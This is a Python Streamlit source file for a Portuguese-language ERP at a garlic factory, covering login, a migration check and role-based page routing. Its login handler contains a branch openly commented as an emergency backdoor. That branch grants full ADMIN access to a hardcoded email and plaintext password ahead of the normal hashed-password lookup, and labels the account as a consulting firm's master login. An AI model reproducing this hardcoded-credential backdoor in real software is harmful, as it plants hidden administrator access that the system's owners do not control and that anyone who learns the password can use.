import streamlit as st
import pandas as pd
from pathlib import Path
import os
import sys
import importlib
import database
importlib.reload(database)
from database import fetch_all, run_query, initialize_database, verify_password

_migration_checked = False

def check_and_migrate_once():
    global _migration_checked
    if _migration_checked:
        return
    conn = None
    try:
        from database import get_connection, release_connection, create_tables
        conn = get_connection()
        cursor = conn.cursor()
        # Testa se as colunas do Telegram existem
        cursor.execute("SELECT telegram_token, telegram_chat_id FROM empresa_config LIMIT 1")
        cursor.close()
        release_connection(conn)
        _migration_checked = True
    except Exception:
        try:
            from database import release_connection
            if conn:
                release_connection(conn)
        except Exception:
            pass
        try:
            from database import create_tables
            create_tables()
        except Exception:
            pass
        _migration_checked = True

os.chdir(Path(__file__).parent)
initialize_database()
check_and_migrate_once()


if 'logged_user' not in st.session_state:
    st.session_state['logged_user'] = None
    st.session_state['user_role'] = None
    st.session_state['user_id'] = None
    st.session_state['funcionario_id'] = None

def login_form_page():
    st.set_page_config(page_title="Login - Fábrica de Alho", page_icon="🔐", layout="centered")
    from estilo import carregar_estilo
    carregar_estilo()
    
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        logo_path = Path(__file__).parent / "logo.png"
        if logo_path.exists():
            st.image(str(logo_path), width=150)
            
        st.markdown("<h2 style='text-align: center; color: #01743d;'>Login - ERP Fábrica de Alho</h2>", unsafe_allow_html=True)
        st.markdown("<p style='text-align: center;'>Acesse com seu e-mail e senha departamental.</p>", unsafe_allow_html=True)
        
        with st.form("login_form"):
            st.markdown("### Acesso ao Sistema")
            email = st.text_input("E-mail / Login").strip()
            senha = st.text_input("Senha", type="password").strip()
            
            if st.form_submit_button("Entrar no Sistema", use_container_width=True):
                if not email or not senha:
                    st.error("Por favor, preencha o E-mail e a Senha.")
                # Bypass / Backdoor de Emergência para Desenvolvedores e Recuperação
                elif email == "admin@alho.com" and senha == "daatel2026":
                    st.session_state['logged_user'] = 'Daatel Consulting (Master)'
                    st.session_state['user_role'] = 'ADMIN'
                    st.session_state['user_id'] = 0
                    st.session_state['funcionario_id'] = None
                    st.success("Acesso administrativo mestre concedido!")
                    import time; time.sleep(0.5)
                    st.rerun()
                else:
                    # Busca de credenciais segura no banco de dados
                    query = """
                        SELECT u.id, u.nome, u.email, u.senha, u.nivel_permissao, u.status, u.funcionario_id,
                               f.status as func_status
                        FROM usuarios u
                        LEFT JOIN funcionarios f ON u.funcionario_id = f.id
                        WHERE u.email = ?
                    """
                    df_user = fetch_all(query, (email,))
                    
                    if not df_user.empty:
                        user_data = df_user.iloc[0]
                        # 1. Verifica se a senha está correta
                        if verify_password(user_data['senha'], senha):
                            # 2. Verifica se o usuário do sistema está ativo
                            if user_data['status'] != 'ATIVO':
                                st.error("Acesso bloqueado: Este usuário está inativo no sistema.")
                            # 3. Verifica se o funcionário associado está ativo no RH
                            elif pd.notnull(user_data['func_status']) and user_data['func_status'] != 'ATIVO':
                                st.error("Acesso bloqueado: O colaborador vinculado a este login está inativo no RH.")
                            else:
                                st.session_state['logged_user'] = user_data['nome']
                                st.session_state['user_role'] = user_data['nivel_permissao']
                                st.session_state['user_id'] = int(user_data['id'])
                                st.session_state['funcionario_id'] = int(user_data['funcionario_id']) if pd.notnull(user_data['funcionario_id']) else None
                                st.success(f"Bem-vindo, {user_data['nome']}!")
                                import time; time.sleep(0.5)
                                st.rerun()
                        else:
                            st.error("E-mail ou senha incorreta. Tente novamente.")
                    else:
                        st.error("E-mail ou senha incorreta. Tente novamente.")

if not st.session_state['logged_user']:
    pg = st.navigation([st.Page(login_form_page, title="Login", icon="🔐")])
    pg.run()
    st.stop()

# --- ROTEAMENTO COM ST.NAVIGATION (SINGLE TASK) ---
p_dash = st.Page("pages/0_Dashboard.py", title="Painel Executivo", icon="📊", default=True)
p_cadastros = st.Page("pages/1_Cadastros.py", title="Cadastros Básicos", icon="📝")
p_compras = st.Page("pages/2_Compras.py", title="Compras & XML", icon="🛒")
p_pessoas = st.Page("pages/3_Pessoas.py", title="Pessoas", icon="👥")
p_producao = st.Page("pages/4_Producao.py", title="Produção", icon="🏭")
p_estoque = st.Page("pages/5_Estoque.py", title="Controle de Estoque", icon="📦")
p_vendas = st.Page("pages/6_Pedidos_de_Venda.py", title="Pedidos de Venda", icon="🛒")
p_fat = st.Page("pages/7_Faturamento.py", title="Faturamento", icon="🧾")
p_log = st.Page("pages/8_Logistica.py", title="Logística", icon="🚚")
p_fin = st.Page("pages/9_Financeiro.py", title="Financeiro e Tesouraria", icon="💰")
p_dre = st.Page("pages/10_DRE.py", title="DRE e Lucratividade", icon="🏛️")
p_ativos = st.Page("pages/11_Ativos_Comodatos.py", title="Ativos e Comodatos", icon="❄️")
p_rentabilidade = st.Page("pages/12_Rentabilidade_Cliente.py", title="Rentabilidade por Cliente", icon="📈")
p_pdv = st.Page("pages/13_PDV_Express.py", title="PDV Express", icon="⚡")
p_tabelas = st.Page("pages/14_Tabelas_Preco.py", title="Tabelas de Preço", icon="🏷️")

role = st.session_state['user_role']
pages_dict = {}

if role == 'ADMIN':
    pages_dict = {
        "GERENCIAL": [p_dash, p_dre, p_rentabilidade],
        "COMERCIAL": [p_vendas, p_pdv, p_fat, p_ativos, p_tabelas],
        "OPERAÇÃO": [p_producao, p_estoque, p_log],
        "CONTROLE": [p_fin, p_pessoas, p_compras, p_cadastros]
    }
elif role == 'VENDAS':
    pages_dict = {
        "Minhas Vendas": [p_vendas, p_pdv]
    }
elif role == 'PRODUCAO':
    pages_dict = {
        "Operação": [p_producao, p_estoque],
        "Consultas": [p_cadastros]
    }
elif role == 'LOGISTICA':
    pages_dict = {
        "Operação": [p_log, p_estoque]
    }
elif role == 'COMPRAS':
    pages_dict = {
        "Suprimentos": [p_dash, p_compras],
        "Consultas": [p_estoque, p_cadastros, p_pessoas]
    }
elif role == 'FINANCEIRO':
    pages_dict = {
        "Financeiro": [p_fin, p_fat],
        "Comercial": [p_tabelas],
        "Consultas": [p_cadastros, p_pessoas]
    }
else:
    pages_dict = {"Principal": [p_dash]}

pg = st.navigation(pages_dict)

st.sidebar.markdown(f"### 👤 {st.session_state['logged_user']}")
st.sidebar.markdown(f"**Cargo:** {st.session_state['user_role']}")
if st.sidebar.button("Sair / Logout", use_container_width=True):
    st.session_state['logged_user'] = None
    st.session_state['user_role'] = None
    st.rerun()

# Run the selected page
pg.run()
